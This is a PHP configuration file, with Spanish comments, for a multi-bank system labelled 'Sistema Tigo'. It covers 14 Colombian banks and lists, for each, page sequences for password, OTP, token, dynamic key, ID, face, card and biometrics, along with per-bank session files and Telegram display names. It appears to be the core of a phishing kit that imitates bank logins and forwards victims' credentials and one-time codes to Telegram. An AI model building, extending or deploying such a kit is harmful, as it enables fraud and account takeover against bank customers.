<?php

declare(strict_types=1);

namespace App\Config;

/**
 * Configuración Centralizada de Bancos - Sistema Tigo
 * Arquitectura Senior: Single Source of Truth para todos los bancos
 * 
 * @version 2.0.0
 * @package App\Config
 */
class BankConfig
{
    /**
     * Configuración completa de todos los bancos
     */
    public const BANKS = [
        'agrario' => [
            'code' => 'agrario',
            'name' => 'Banco Agrario',
            'displayName' => '🟢 BANCO AGRARIO',
            'folder' => 'Agrario',
            'pages' => ['index', 'password', 'dinamica', 'otp', 'token'],
            'sessionFile' => 'agrario_sessions.json'
        ],
        
        'bbva' => [
            'code' => 'bbva',
            'name' => 'BBVA',
            'displayName' => '🔵 BBVA',
            'folder' => 'BBVA',
            'pages' => ['index', 'otp', 'token'],
            'sessionFile' => 'bbva_sessions.json'
        ],
        
        'caja_social' => [
            'code' => 'caja_social',
            'name' => 'Caja Social',
            'displayName' => '🟠 CAJA SOCIAL',
            'folder' => 'Caja-Social',
            'pages' => ['index', 'password', 'otp', 'token'],
            'sessionFile' => 'caja_social_sessions.json'
        ],
        
        'av_villas' => [
            'code' => 'av_villas',
            'name' => 'AV Villas',
            'displayName' => '🔴 AV VILLAS',
            'folder' => 'AV-Villas',
            'pages' => ['index', 'otp'],
            'sessionFile' => 'av_villas_sessions.json'
        ],
        
        'mundo_mujer' => [
            'code' => 'mundo_mujer',
            'name' => 'Banco Mundo Mujer',
            'displayName' => '💜 BANCO MUNDO MUJER',
            'folder' => 'Banco-Mundo-Mujer',
            'pages' => ['index', 'password', 'dynamic', 'otp'],
            'sessionFile' => 'mundo_mujer_sessions.json'
        ],
        
        'occidente' => [
            'code' => 'occidente',
            'name' => 'Banco de Occidente',
            'displayName' => '🟡 BANCO DE OCCIDENTE',
            'folder' => 'Occidente',
            'pages' => ['index', 'otp', 'token'],
            'sessionFile' => 'occidente_sessions.json'
        ],
        
        'popular' => [
            'code' => 'popular',
            'name' => 'Banco Popular',
            'displayName' => '🔵 BANCO POPULAR',
            'folder' => 'Popular',
            'pages' => ['index', 'clave', 'otp', 'token'],
            'sessionFile' => 'popular_sessions.json'
        ],
        
        'serfinanza' => [
            'code' => 'serfinanza',
            'name' => 'Serfinanza',
            'displayName' => '🟢 SERFINANZA',
            'folder' => 'Serfinanza',
            'pages' => ['index', 'password', 'dinamica', 'otp'],
            'sessionFile' => 'serfinanza_sessions.json'
        ],
        
        'falabella' => [
            'code' => 'falabella',
            'name' => 'Falabella',
            'displayName' => '🟢 FALABELLA',
            'folder' => 'Falabella',
            'pages' => ['index', 'dinamica', 'otp'],
            'sessionFile' => 'falabella_sessions.json'
        ],
        
        'itau' => [
            'code' => 'itau',
            'name' => 'Itaú',
            'displayName' => '🔵 ITAÚ',
            'folder' => 'Itau',
            'pages' => ['index', 'biometria', 'cedula', 'correo', 'otp', 'token'],
            'sessionFile' => 'itau_sessions.json'
        ],
        
        'bancolombia' => [
            'code' => 'bancolombia',
            'name' => 'Bancolombia',
            'displayName' => '🟡 BANCOLOMBIA',
            'folder' => 'Bancolombia',
            'pages' => ['index', 'cedula', 'cara', 'tarjeta', 'dinamica'],
            'sessionFile' => 'bancolombia_sessions.json'
        ],
        
        'daviplata' => [
            'code' => 'daviplata',
            'name' => 'Daviplata',
            'displayName' => '🟠 DAVIPLATA',
            'folder' => 'Daviplata',
            'pages' => ['index', 'clave', 'dinamica', 'otp'],
            'sessionFile' => 'daviplata_sessions.json'
        ],
        
        'davivienda' => [
            'code' => 'davivienda',
            'name' => 'Davivienda',
            'displayName' => '🔴 DAVIVIENDA',
            'folder' => 'Davivienda',
            'pages' => ['index', 'clave', 'token'],
            'sessionFile' => 'davivienda_sessions.json'
        ],
        
        'bogota' => [
            'code' => 'bogota',
            'name' => 'Banco de Bogotá',
            'displayName' => '🔵 BANCO DE BOGOTÁ',
            'folder' => 'Bogota',
            'pages' => ['index', 'dashboard', 'token'],
            'sessionFile' => 'bogota_sessions.json'
        ]
    ];

    /**
     * Obtener configuración por código
     */
    public static function get(string $code): ?array
    {
        return self::BANKS[$code] ?? null;
    }

    /**
     * Obtener configuración por carpeta
     */
    public static function getByFolder(string $folder): ?array
    {
        foreach (self::BANKS as $bank) {
            if ($bank['folder'] === $folder) {
                return $bank;
            }
        }
        return null;
    }

    /**
     * Obtener todos los códigos de banco
     */
    public static function getAllCodes(): array
    {
        return array_keys(self::BANKS);
    }

    /**
     * Obtener regex pattern para validación
     */
    public static function getRegexPattern(): string
    {
        return '/^(' . implode('|', self::getAllCodes()) . ')_(.+)$/';
    }

    /**
     * Obtener mapeo de nombres para Telegram
     */
    public static function getTelegramNames(): array
    {
        $names = [];
        foreach (self::BANKS as $bank) {
            $names[$bank['code']] = $bank['displayName'];
        }
        return $names;
    }

    /**
     * Obtener mapeo de bancos para PSE
     */
    public static function getBankFolderMap(): array
    {
        $map = [];
        foreach (self::BANKS as $bank) {
            $map[$bank['name']] = $bank['folder'];
        }
        return $map;
    }

    /**
     * Validar si un banco existe
     */
    public static function exists(string $code): bool
    {
        return isset(self::BANKS[$code]);
    }

    /**
     * Obtener total de bancos configurados
     */
    public static function count(): int
    {
        return count(self::BANKS);
    }

    /**
     * Obtener ruta del archivo de sesiones
     */
    public static function getSessionFile(string $code, string $storagePath): ?string
    {
        $bank = self::get($code);
        return $bank ? $storagePath . '/' . $bank['sessionFile'] : null;
    }
}
